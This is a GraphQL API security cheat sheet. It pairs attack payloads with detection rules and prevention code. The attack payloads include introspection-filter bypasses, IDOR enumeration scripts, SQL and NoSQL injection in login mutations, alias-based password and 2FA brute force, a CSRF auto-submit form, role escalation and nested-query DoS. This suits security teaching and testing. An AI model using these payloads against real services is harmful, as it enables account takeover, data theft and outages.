# GraphQL API Vulnerabilities - Complete Cheat Sheet

## Table of Contents

1. [GraphQL Basics](#graphql-basics)
2. [Endpoint Discovery](#endpoint-discovery)
3. [Introspection Queries](#introspection-queries)
4. [Exploitation Payloads](#exploitation-payloads)
5. [Burp Suite Commands](#burp-suite-commands)
6. [Attack Techniques](#attack-techniques)
7. [Bypass Methods](#bypass-methods)
8. [Tools & Automation](#tools--automation)
9. [Detection Signatures](#detection-signatures)
10. [Prevention Controls](#prevention-controls)

---

## GraphQL Basics

### Query Structure

```graphql
# Basic query
query {
  fieldName
}

# Query with arguments
query {
  getUser(id: 1) {
    username
    email
  }
}

# Query with variables
query GetUser($id: Int!) {
  getUser(id: $id) {
    username
    email
  }
}

# Variables passed separately
{
  "query": "query GetUser($id: Int!) { getUser(id: $id) { username } }",
  "variables": {"id": 1}
}
```

### Mutation Structure

```graphql
# Basic mutation
mutation {
  createUser(input: {username: "test", password: "test123"}) {
    id
    username
  }
}

# Mutation with variables
mutation CreateUser($input: CreateUserInput!) {
  createUser(input: $input) {
    id
    username
  }
}
```

### Aliases

```graphql
# Execute multiple queries with different arguments
query {
  user1: getUser(id: 1) { username }
  user2: getUser(id: 2) { username }
  user3: getUser(id: 3) { username }
}
```

### Fragments

```graphql
fragment UserFields on User {
  id
  username
  email
}

query {
  getUser(id: 1) {
    ...UserFields
  }
}
```

---

## Endpoint Discovery

### Common GraphQL Endpoints

```
/graphql
/api
/api/graphql
/graphql/api
/v1/graphql
/v2/graphql
/gql
/query
/graph
/graphql/console
/graphql.php
/api/v1/graphql
/api/v2/graphql
```

### Discovery Requests

**Universal Query:**
```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__typename}"}
```

**Expected Response:**
```json
{"data":{"__typename":"query"}}
```

**GET Method:**
```http
GET /graphql?query={__typename} HTTP/1.1
```

**Alternative Content-Types:**
```http
# JSON (standard)
Content-Type: application/json

# URL-encoded (CSRF-vulnerable)
Content-Type: application/x-www-form-urlencoded

# GraphQL-specific
Content-Type: application/graphql

# Form data
Content-Type: multipart/form-data
```

### Automated Discovery Script

```bash
#!/bin/bash
# graphql-discover.sh

DOMAIN=$1
PATHS=("graphql" "api" "api/graphql" "v1/graphql" "gql" "query" "graph")

for path in "${PATHS[@]}"; do
  echo "[*] Testing: https://$DOMAIN/$path"

  response=$(curl -s -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    "https://$DOMAIN/$path")

  if [[ $response == *"__typename"* ]]; then
    echo "[+] FOUND: https://$DOMAIN/$path"
  fi
done
```

**Usage:**
```bash
chmod +x graphql-discover.sh
./graphql-discover.sh target.com
```

---

## Introspection Queries

### Full Schema Introspection

```graphql
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          description
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
          defaultValue
        }
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
        isDeprecated
        deprecationReason
      }
    }
    directives {
      name
      description
      locations
      args {
        name
        description
        type {
          name
          kind
        }
      }
    }
  }
}
```

### Minimal Introspection

```graphql
# List all types
{__schema{types{name}}}

# List all queries
{__schema{queryType{fields{name}}}}

# List all mutations
{__schema{mutationType{fields{name}}}}

# Get specific type details
{__type(name:"User"){fields{name type{name}}}}
```

### Query-Specific Introspection

```graphql
# Get all fields of Query type
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
        type {
          name
          kind
        }
      }
    }
  }
}

# Get all fields of Mutation type
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

### Introspection Bypasses

```graphql
# Newline injection (most common)
{__schema
{types{name}}}

# URL-encoded newline
{__schema%0A{types{name}}}

# Space injection
{__schema {types{name}}}

# URL-encoded space
{__schema%20{types{name}}}

# Tab injection
{__schema	{types{name}}}

# URL-encoded tab
{__schema%09{types{name}}}

# Carriage return
{__schema%0D{types{name}}}

# CRLF injection
{__schema%0D%0A{types{name}}}

# Multiple newlines
{__schema


{types{name}}}

# Comment injection
{__schema#comment
{types{name}}}

# Mixed whitespace
{__schema%20%0A%09{types{name}}}
```

### Alternative HTTP Methods

```http
# POST with JSON (standard)
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__schema{types{name}}}"}

# GET with query parameter
GET /graphql?query={__schema{types{name}}} HTTP/1.1

# POST with URL-encoded
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query={__schema{types{name}}}

# POST with GraphQL content-type
POST /graphql HTTP/1.1
Content-Type: application/graphql

{__schema{types{name}}}
```

---

## Exploitation Payloads

### IDOR (Insecure Direct Object References)

```graphql
# Single user query
query {
  getUser(id: 1) {
    id
    username
    email
    password
    role
    apiKey
    secretKey
  }
}

# Batch enumeration with aliases
query {
  user1: getUser(id: 1) { username password email role }
  user2: getUser(id: 2) { username password email role }
  user3: getUser(id: 3) { username password email role }
  user4: getUser(id: 4) { username password email role }
  user5: getUser(id: 5) { username password email role }
  user6: getUser(id: 6) { username password email role }
  user7: getUser(id: 7) { username password email role }
  user8: getUser(id: 8) { username password email role }
  user9: getUser(id: 9) { username password email role }
  user10: getUser(id: 10) { username password email role }
}

# GUID/UUID enumeration
query {
  getUser(id: "550e8400-e29b-41d4-a716-446655440000") {
    username
    email
  }
}

# Alternative field names
query {
  user(id: 1) { username }
  getUserById(id: 1) { username }
  findUser(id: 1) { username }
  fetchUser(id: 1) { username }
}
```

### Information Disclosure

```graphql
# Request all possible sensitive fields
query {
  getUser(id: 1) {
    id
    username
    email
    password
    passwordHash
    apiKey
    apiSecret
    secretKey
    accessToken
    refreshToken
    privateKey
    ssn
    creditCard
    bankAccount
    salary
    dateOfBirth
    address
    phoneNumber
    role
    permissions
    isAdmin
    isSuperuser
  }
}

# Hidden blog post access
query {
  getBlogPost(id: 3) {
    id
    title
    content
    postPassword
    secretData
    adminNotes
    privateContent
    isDraft
    isHidden
  }
}

# System information
query {
  __schema {
    types {
      name
      description
    }
  }
  getSystemInfo {
    version
    environment
    debug
    database
    serverTime
  }
}
```

### Authentication Bypass

```graphql
# Direct admin login
mutation {
  login(input: {username: "admin", password: "admin"}) {
    token
    success
    user {
      id
      role
      permissions
    }
  }
}

# SQL injection in GraphQL
mutation {
  login(input: {username: "admin' OR '1'='1'--", password: "anything"}) {
    token
  }
}

# NoSQL injection
mutation {
  login(input: {username: {"$ne": null}, password: {"$ne": null}}) {
    token
  }
}

# JWT token manipulation
mutation {
  login(input: {username: "user", password: "pass"}) {
    token  # Manipulate this JWT
  }
}
```

### Rate Limiting Bypass

```graphql
# Alias-based brute force (example with 10 attempts)
mutation {
  attempt0: login(input: {username: "carlos", password: "123456"}) { token success }
  attempt1: login(input: {username: "carlos", password: "password"}) { token success }
  attempt2: login(input: {username: "carlos", password: "12345678"}) { token success }
  attempt3: login(input: {username: "carlos", password: "qwerty"}) { token success }
  attempt4: login(input: {username: "carlos", password: "abc123"}) { token success }
  attempt5: login(input: {username: "carlos", password: "monkey"}) { token success }
  attempt6: login(input: {username: "carlos", password: "letmein"}) { token success }
  attempt7: login(input: {username: "carlos", password: "trustno1"}) { token success }
  attempt8: login(input: {username: "carlos", password: "dragon"}) { token success }
  attempt9: login(input: {username: "carlos", password: "baseball"}) { token success }
}

# 2FA/OTP brute force
mutation {
  verify0: verify2FA(code: "000000") { success }
  verify1: verify2FA(code: "000001") { success }
  verify2: verify2FA(code: "000002") { success }
  # ... continue to 999999
}

# Coupon/promo code testing
mutation {
  promo1: applyPromoCode(code: "SAVE10") { discount }
  promo2: applyPromoCode(code: "SAVE20") { discount }
  promo3: applyPromoCode(code: "SAVE30") { discount }
  # ... test many codes
}
```

### CSRF Exploitation

```graphql
# Email change mutation (vulnerable if accepts URL-encoded)
mutation {
  changeEmail(input: {email: "attacker@evil.com"}) {
    email
    success
  }
}

# Password change
mutation {
  changePassword(input: {newPassword: "hacked123"}) {
    success
  }
}

# Delete account
mutation {
  deleteAccount {
    success
  }
}

# Transfer funds
mutation {
  transferMoney(input: {to: "attacker", amount: 1000}) {
    transactionId
    success
  }
}
```

### Deletion & Modification

```graphql
# Delete user
mutation {
  deleteUser(id: 3) {
    success
    deletedId
  }
}

# Alternative deletion syntax
mutation {
  deleteOrganizationUser(input: {id: 3}) {
    user {
      id
      username
    }
  }
}

# Update user role
mutation {
  updateUser(id: 2, input: {role: "admin"}) {
    id
    role
  }
}

# Modify sensitive data
mutation {
  updateUser(id: 1, input: {password: "hacked", isAdmin: true}) {
    id
    username
    role
  }
}
```

### Batching & Aliasing Attacks

```graphql
# Query batching (multiple operations)
query {
  user: getUser(id: 1) { username }
  post: getPost(id: 1) { title }
  comment: getComment(id: 1) { text }
}

# Mutation batching
mutation {
  action1: deletePost(id: 1) { success }
  action2: deletePost(id: 2) { success }
  action3: deletePost(id: 3) { success }
}

# Deep nesting (DoS)
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  # ... continue nesting
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## Burp Suite Commands

### Proxy Workflow

```
1. Browse application with Burp proxy enabled
2. Proxy > HTTP History
3. Filter: Search for "graphql", "gql", "api"
4. Look for POST requests with JSON body
5. Right-click > Send to Repeater
```

### Repeater Operations

```
Keyboard Shortcuts:
Ctrl+R / Cmd+R       Send to Repeater
Ctrl+Space           Send request
Ctrl+I               Send to Intruder
Ctrl+Shift+R         Switch request/response
Ctrl+F / Cmd+F       Search in response

Context Menu:
Right-click > GraphQL > Set introspection query
Right-click > GraphQL > Save GraphQL queries to site map
Right-click > Change request method (convert GET↔POST)
Right-click > Engagement tools > Generate CSRF PoC
```

### GraphQL Tab Features

```
Located next to "Request" and "Response" tabs

Features:
- Syntax highlighting
- Query formatting
- Variable editor
- Operation selector
- Field suggestions (if introspection is available)

Usage:
1. Send GraphQL request to Repeater
2. Click "GraphQL" tab
3. Modify query in "Query" panel
4. Edit variables in "Variables" panel
5. Send request
```

### Site Map Integration

```
1. Run introspection query in Repeater
2. Right-click introspection response
3. Select "GraphQL > Save GraphQL queries to site map"
4. Navigate to: Target > Site map
5. Expand hostname > GraphQL queries
6. Browse discovered queries and mutations
7. Right-click any query > Send to Repeater
```

### Intruder Configuration

```
For ID enumeration:
1. Send GraphQL request to Intruder
2. Set payload position: getUser(id:§1§)
3. Payload type: Numbers
4. From: 1, To: 100, Step: 1
5. Start attack

For brute force (less efficient than aliases):
1. Set payload position: password:"§pass§"
2. Payload type: Simple list
3. Load wordlist
4. Configure resource pool (single thread for rate limits)
5. Add Grep-Match rule for success indicators
```

### Scanner Configuration

```
1. Right-click GraphQL request
2. "Do active scan" or "Do passive scan"
3. Configure scan settings:
   - Audit checks: Select all
   - Scan accuracy: Thorough
   - Scan speed: Normal

Note: Burp Scanner may not detect all GraphQL-specific issues
```

---

## Attack Techniques

### 1. Schema Enumeration

**Goal**: Discover all available queries, mutations, and types

**Technique**:
```graphql
# Full introspection
{
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

**If introspection is disabled**:
- Try whitespace bypasses
- Use field suggestions (Apollo Server)
- Use Clairvoyance tool
- Guess common field names

### 2. IDOR via ID Parameters

**Goal**: Access other users' data

**Technique**:
```graphql
# Test sequential IDs
query { getUser(id: 1) { email } }
query { getUser(id: 2) { email } }
query { getUser(id: 3) { email } }

# Batch with aliases
query {
  u1: getUser(id: 1) { email }
  u2: getUser(id: 2) { email }
  u3: getUser(id: 3) { email }
}
```

### 3. Rate Limiting Bypass

**Goal**: Brute force authentication or codes

**Technique**:
```graphql
mutation {
  a1: login(input: {username: "user", password: "pass1"}) { success }
  a2: login(input: {username: "user", password: "pass2"}) { success }
  # ... 100+ aliases in ONE request
}
```

**Why it works**: Rate limiters count HTTP requests, not GraphQL operations

### 4. CSRF Over GraphQL

**Goal**: Execute unauthorized mutations from attacker-controlled site

**Requirements**:
- Endpoint accepts `application/x-www-form-urlencoded`
- No CSRF tokens
- No SameSite cookie protection

**Technique**:
```html
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value="mutation{changeEmail(input:{email:\"attacker@evil.com\"}){email}}" />
</form>
<script>document.forms[0].submit();</script>
```

### 5. SQL Injection via GraphQL

**Goal**: Inject SQL commands through GraphQL arguments

**Technique**:
```graphql
query {
  getUser(id: "1' OR '1'='1'--") {
    username
  }
}

mutation {
  login(input: {
    username: "admin' OR '1'='1'--",
    password: "anything"
  }) {
    token
  }
}
```

### 6. Authorization Bypass

**Goal**: Access privileged resources without proper authorization

**Technique**:
```graphql
# Try accessing admin resources with regular user token
query {
  adminPanel {
    users {
      username
      password
    }
  }
}

# Modify role in mutation
mutation {
  updateUser(id: 2, input: {role: "admin"}) {
    id
    role
  }
}
```

### 7. Batch Query Abuse

**Goal**: Extract large amounts of data in one request

**Technique**:
```graphql
query {
  # Extract 100 users at once
  user1: getUser(id: 1) { username email }
  user2: getUser(id: 2) { username email }
  # ... continue to user100
}
```

### 8. Denial of Service

**Goal**: Overwhelm the server with expensive queries

**Technique**:
```graphql
# Deep nesting
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  # ... 50+ levels deep
                }
              }
            }
          }
        }
      }
    }
  }
}

# Large alias batch
query {
  # 10,000 aliases
  u1: getUser(id: 1) { ... }
  u2: getUser(id: 2) { ... }
  # ...
  u10000: getUser(id: 10000) { ... }
}
```

---

## Bypass Methods

### Introspection Filters

**Common Filter Patterns**:
```regex
__schema\{
__type\(
__Schema
__Type
```

**Bypass Techniques**:

1. **Whitespace Injection**:
```graphql
{__schema
{types{name}}}
```

2. **URL Encoding**:
```
{__schema%0A{types{name}}}
```

3. **Alternative Methods**:
```http
# Try GET instead of POST
GET /graphql?query={__schema{types{name}}}

# Try different content-types
Content-Type: application/x-www-form-urlencoded
Content-Type: application/graphql
```

4. **Case Variations** (rarely works):
```graphql
{__Schema{types{name}}}
{__SCHEMA{types{name}}}
```

### WAF/IPS Evasion

**Technique 1: Encoding**
```
# URL encoding
%7B__schema%7Btypes%7Bname%7D%7D%7D

# Double URL encoding
%257B__schema%257Btypes%257Bname%257D%257D%257D

# Unicode encoding
\u007b__schema\u007btypes\u007bname\u007d\u007d\u007d
```

**Technique 2: Whitespace Variations**
```graphql
# Excessive whitespace
{
  __schema
  {
    types
    {
      name
    }
  }
}

# Mixed whitespace
{__schema%0A%09%20{types{name}}}
```

**Technique 3: Case Sensitivity**
```graphql
# Mixed case in field names (depends on implementation)
query {
  GetUser(Id: 1) {
    UserName
    Email
  }
}
```

### Authorization Bypasses

**Technique 1: Parameter Tampering**
```graphql
# Add unauthorized fields
mutation {
  updateUser(id: 2, input: {
    username: "user2",
    role: "admin",           # Try adding
    isAdmin: true,           # Try adding
    permissions: ["*"]       # Try adding
  }) {
    role
  }
}
```

**Technique 2: Object Injection**
```graphql
# Include unexpected fields
mutation {
  createPost(input: {
    title: "Post",
    content: "Content",
    authorId: 1,              # Try manipulating
    isPublished: true,        # Try adding
    isFeatured: true          # Try adding
  }) {
    id
  }
}
```

**Technique 3: Batch Operations**
```graphql
# Perform unauthorized action mixed with authorized ones
mutation {
  action1: updateMyProfile(input: {bio: "..."}) { success }
  action2: deleteUser(id: 5) { success }  # Sneak in
  action3: updateMyEmail(email: "...") { success }
}
```

---

## Tools & Automation

### Command-Line Tools

**cURL Examples**:
```bash
# Basic query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'

# Introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# With authentication
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"query{getUser(id:1){username}}"}'

# With variables
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetUser($id: Int!) { getUser(id: $id) { username } }",
    "variables": {"id": 1}
  }'
```

### Python Scripts

**Basic GraphQL Client**:
```python
import requests

class GraphQLClient:
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/json"}

    def execute(self, query, variables=None):
        payload = {"query": query}
        if variables:
            payload["variables"] = variables

        response = requests.post(self.url, json=payload, headers=self.headers)
        return response.json()

    def introspect(self):
        query = "{__schema{types{name fields{name}}}}"
        return self.execute(query)

# Usage
client = GraphQLClient("https://target.com/graphql")
result = client.execute("query{getUser(id:1){username}}")
print(result)
```

**IDOR Enumeration Script**:
```python
import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

for user_id in range(1, 101):
    query = {
        "query": f"query{{getUser(id:{user_id}){{id username email}}}}"
    }

    response = requests.post(url, json=query, headers=headers)
    data = response.json()

    if "data" in data and data["data"]["getUser"]:
        user = data["data"]["getUser"]
        print(f"[+] User {user['id']}: {user['username']} ({user['email']})")
```

**Brute Force Generator**:
```python
def generate_alias_mutation(username, passwords):
    """Generate aliased brute force mutation"""
    mutation = "mutation{\n"
    for i, password in enumerate(passwords):
        mutation += f'  attempt{i}:login(input:{{username:"{username}",password:"{password}"}})'
        mutation += '{token success}\n'
    mutation += "}"
    return mutation

# Usage
passwords = ["password", "123456", "admin", "letmein"]
payload = generate_alias_mutation("carlos", passwords)
print(payload)
```

### Burp Suite Extensions

**1. InQL Scanner**
- Automated introspection
- Query template generation
- Vulnerability scanning
- Custom payload testing

**Installation**:
```
BApp Store > InQL Scanner > Install
```

**Usage**:
1. Target → Right-click → InQL > Analyze
2. Review discovered queries/mutations
3. Generate test payloads
4. Execute scans

**2. GraphQL Raider**
- Schema visualization
- Query builder
- Mutation testing
- Batch operations

**3. Autorize**
- Test authorization on all GraphQL operations
- Compare responses between different user roles
- Identify privilege escalation

### Standalone Tools

**1. Clairvoyance**
```bash
# Install
pip install clairvoyance

# Reconstruct schema when introspection is disabled
clairvoyance -o schema.json \
  -w wordlist.txt \
  https://target.com/graphql

# With authentication
clairvoyance -o schema.json \
  -w wordlist.txt \
  -H "Authorization: Bearer TOKEN" \
  https://target.com/graphql
```

**2. GraphQL Voyager**
```bash
# Visualize schema from introspection
graphql-voyager schema.json
```

**3. GraphQL Playground**
```bash
# Interactive GraphQL IDE
npm install -g graphql-playground
graphql-playground
```

**4. Altair GraphQL Client**
- Cross-platform GUI client
- Query history
- Variable management
- Subscription support

**5. graphql-cop**
```bash
# Security testing tool
npm install -g graphql-cop

# Run security checks
graphql-cop -u https://target.com/graphql
```

---

## Detection Signatures

### Log Patterns

**Apache/Nginx Access Logs**:
```
# GraphQL endpoint access
POST /graphql HTTP/1.1 200
POST /api HTTP/1.1 200
GET /graphql?query=... HTTP/1.1 200

# Introspection attempts
POST /graphql HTTP/1.1 200 "__schema"
POST /api HTTP/1.1 403 "Introspection not allowed"

# Large payloads (possible batching attack)
POST /graphql HTTP/1.1 200 [Content-Length: 50000+]

# CSRF attempts
POST /graphql HTTP/1.1 200 "application/x-www-form-urlencoded"
```

**Application Logs**:
```
# Query patterns
[GraphQL] Query: __schema
[GraphQL] Query: getUser
[GraphQL] Mutation: deleteUser
[GraphQL] Error: Introspection disabled

# Authorization failures
[GraphQL] Unauthorized: getUser(id:1)
[GraphQL] Forbidden: deleteUser
[GraphQL] Invalid token

# Rate limiting
[GraphQL] Rate limit exceeded
[GraphQL] Too many requests
```

### SIEM Rules

**Splunk Query**:
```
index=web_logs sourcetype=graphql
| where like(query, "%__schema%")
| stats count by src_ip, query
| where count > 10
```

**ELK Stack (Elasticsearch)**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"path": "/graphql"}},
        {"match": {"request_body": "__schema"}}
      ]
    }
  }
}
```

**Azure Sentinel**:
```kql
AzureDiagnostics
| where RequestUri contains "graphql"
| where RequestBody contains "__schema"
| summarize count() by ClientIP, RequestBody
```

### WAF Rules

**ModSecurity Rules**:
```
# Block introspection
SecRule REQUEST_BODY "@rx __schema" \
  "id:1000,phase:2,deny,status:403,msg:'GraphQL introspection attempt'"

# Block excessive batching
SecRule REQUEST_BODY "@rx (mutation|query).*:\s*(mutation|query).*:\s*(mutation|query)" \
  "id:1001,phase:2,deny,status:403,msg:'GraphQL batch abuse'"

# Rate limit GraphQL endpoints
SecAction "id:1002,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR},\
  setvar:ip.graphql_requests=+1,deprecatevar:ip.graphql_requests=10/60"
SecRule IP:GRAPHQL_REQUESTS "@gt 50" \
  "id:1003,phase:2,deny,status:429,msg:'GraphQL rate limit exceeded'"
```

**AWS WAF Rules**:
```json
{
  "Name": "BlockGraphQLIntrospection",
  "Priority": 1,
  "Statement": {
    "ByteMatchStatement": {
      "SearchString": "__schema",
      "FieldToMatch": {"Body": {}},
      "TextTransformations": [{"Priority": 0, "Type": "LOWERCASE"}]
    }
  },
  "Action": {"Block": {}},
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "GraphQLIntrospection"
  }
}
```

---

## Prevention Controls

### Server Configuration

**Disable Introspection in Production**:

```javascript
// Apollo Server (Node.js)
const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== 'production',
  playground: process.env.NODE_ENV !== 'production',
});

// Express-GraphQL
app.use('/graphql', graphqlHTTP({
  schema: schema,
  graphiql: false,
}));

// GraphQL-Go
srv := handler.NewDefaultServer(generated.NewExecutableSchema(generated.Config{
  Resolvers: &graph.Resolver{},
}))
srv.AroundResponses(func(ctx context.Context, next graphql.ResponseHandler) *graphql.Response {
  if strings.Contains(graphql.GetOperationContext(ctx).RawQuery, "__schema") {
    return graphql.ErrorResponse(ctx, "Introspection disabled")
  }
  return next(ctx)
})
```

### Query Depth Limiting

```javascript
// Apollo Server
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(5)],  // Max 5 levels deep
});

// Custom implementation
const { ValidationContext, GraphQLError } = require('graphql');

function depthLimitRule(maxDepth) {
  return (validationContext) => {
    return {
      Field(node, key, parent, path, ancestors) {
        const depth = ancestors.filter(
          ancestor => ancestor.kind === 'Field'
        ).length;

        if (depth > maxDepth) {
          validationContext.reportError(
            new GraphQLError(
              `Query depth of ${depth} exceeds max depth of ${maxDepth}`
            )
          );
        }
      }
    };
  };
}
```

### Query Cost Analysis

```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  schema,
  validationRules: [
    createComplexityLimitRule(1000, {
      scalarCost: 1,
      objectCost: 10,
      listFactor: 10,
    }),
  ],
});
```

### Authentication & Authorization

```javascript
// Context-based authentication
const { ApolloServer, AuthenticationError } = require('apollo-server');

const server = new ApolloServer({
  schema,
  context: ({ req }) => {
    const token = req.headers.authorization || '';
    const user = verifyToken(token);

    if (!user) {
      throw new AuthenticationError('Invalid or expired token');
    }

    return { user };
  },
});

// Field-level authorization
const resolvers = {
  Query: {
    getUser: async (parent, { id }, context) => {
      // Check if user can access this resource
      if (!context.user.canViewUser(id)) {
        throw new ForbiddenError('Not authorized to view this user');
      }

      return User.findById(id);
    },
  },
  User: {
    email: (user, args, context) => {
      // Hide email unless viewing own profile or admin
      if (context.user.id !== user.id && !context.user.isAdmin) {
        return null;
      }
      return user.email;
    },
  },
};
```

### CSRF Protection

```javascript
// Only accept JSON content-type
app.use('/graphql', (req, res, next) => {
  if (req.method === 'POST') {
    const contentType = req.headers['content-type'];
    if (!contentType || !contentType.includes('application/json')) {
      return res.status(400).json({
        errors: [{
          message: 'Invalid content-type. Only application/json is accepted.'
        }]
      });
    }
  }
  next();
});

// CSRF token validation
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use('/graphql', csrfProtection);

// SameSite cookies
app.use(session({
  secret: 'your-secret',
  cookie: {
    sameSite: 'strict',
    secure: true,
    httpOnly: true,
  },
}));
```

### Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

// Global rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // Limit each IP to 100 requests per window
  message: 'Too many requests from this IP',
});

app.use('/graphql', limiter);

// Operation-based rate limiting
const { ApolloServerPluginLandingPageDisabled } = require('apollo-server-core');

const server = new ApolloServer({
  schema,
  plugins: [
    {
      requestDidStart() {
        return {
          didResolveOperation({ request, operation }) {
            // Count operations, not just HTTP requests
            const operationCount = operation.selectionSet.selections.length;
            if (operationCount > 10) {
              throw new Error('Too many operations in single request');
            }
          },
        };
      },
    },
  ],
});
```

### Input Validation

```javascript
const { GraphQLScalarType, GraphQLError } = require('graphql');
const validator = require('validator');

// Custom scalar for email validation
const EmailType = new GraphQLScalarType({
  name: 'Email',
  description: 'Email address',
  serialize: value => value,
  parseValue: value => {
    if (!validator.isEmail(value)) {
      throw new GraphQLError('Invalid email address');
    }
    return value;
  },
  parseLiteral: ast => {
    if (ast.kind !== Kind.STRING) {
      throw new GraphQLError('Email must be a string');
    }
    if (!validator.isEmail(ast.value)) {
      throw new GraphQLError('Invalid email address');
    }
    return ast.value;
  },
});

// Use in schema
const typeDefs = gql`
  scalar Email

  type Mutation {
    updateEmail(email: Email!): User
  }
`;
```

### Logging & Monitoring

```javascript
const { ApolloServer } = require('apollo-server');

const server = new ApolloServer({
  schema,
  plugins: [
    {
      requestDidStart(requestContext) {
        console.log('Request started:', {
          query: requestContext.request.query,
          variables: requestContext.request.variables,
          operationName: requestContext.request.operationName,
        });

        return {
          didEncounterErrors(requestContext) {
            console.error('Errors encountered:', requestContext.errors);
          },

          willSendResponse(requestContext) {
            console.log('Response sent');
          },
        };
      },
    },
  ],
  formatError: (error) => {
    // Log full error server-side
    console.error('GraphQL Error:', error);

    // Return sanitized error to client
    return {
      message: process.env.NODE_ENV === 'production'
        ? 'Internal server error'
        : error.message,
      extensions: process.env.NODE_ENV === 'production'
        ? {}
        : error.extensions,
    };
  },
});
```

---

## Quick Reference

### HTTP Status Codes

| Code | Meaning | Common Cause |
|------|---------|--------------|
| 200 OK | Successful | Query executed (may still have errors in response body) |
| 400 Bad Request | Invalid syntax | Malformed GraphQL query |
| 401 Unauthorized | Not authenticated | Missing or invalid token |
| 403 Forbidden | Not authorized | Introspection disabled, insufficient permissions |
| 429 Too Many Requests | Rate limited | Exceeded request threshold |
| 500 Internal Server Error | Server error | Resolver exception, database error |

### Response Structure

```json
{
  "data": {
    // Successful query results
    "getUser": {
      "id": 1,
      "username": "admin"
    }
  },
  "errors": [
    {
      "message": "Error message",
      "locations": [{"line": 2, "column": 3}],
      "path": ["getUser"],
      "extensions": {
        "code": "INTERNAL_SERVER_ERROR"
      }
    }
  ]
}
```

### Common Error Messages

| Error Message | Meaning | Action |
|---------------|---------|--------|
| "Query not present" | GraphQL endpoint confirmed | Proceed with testing |
| "Introspection is disabled" | Introspection blocked | Try bypasses or Clairvoyance |
| "Cannot query field" | Field doesn't exist | Check schema or try suggestions |
| "Too many requests" | Rate limited | Use aliases to bypass |
| "Unauthorized" | Auth required | Obtain token or test for bypass |
| "Validation error" | Invalid syntax | Fix query structure |

---

**Cheat Sheet Version:** 1.0
**Last Updated:** January 2026
**Total Payloads:** 200+
**Total Techniques:** 50+

**Note**: Always test in authorized environments only. Unauthorized testing is illegal.
